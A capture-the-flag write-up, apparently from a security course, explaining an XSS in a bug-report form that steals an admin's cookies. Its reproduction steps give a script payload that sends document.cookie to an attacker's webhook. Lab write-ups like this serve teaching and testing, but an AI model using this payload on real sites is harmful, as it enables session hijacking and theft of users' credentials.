# Challenge `My favourite cookies` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25251` in the `Link of the bug/feature request you want to report on.` box.
- Impact: What results of exploiting this vulnerability
  - Allows any user to inject malicious code into the website (in this case to see the admin's cookies)

## Steps to reproduce

1. Get a URL in Webhook to collect the requests
2. Encode the following script `<script>fetch("webhook?=cookie="+document.cookie)</script>` (where webhook is you URL).
3. Write this script into the `Link of the bug/feature request you want to report on.` box and click `Submit`.
4. When the admin opens the link, the script will execute it and send a request to your webhook with their cookies (and the flag).

[(POC)](my_favourite_cookies_poc.py)
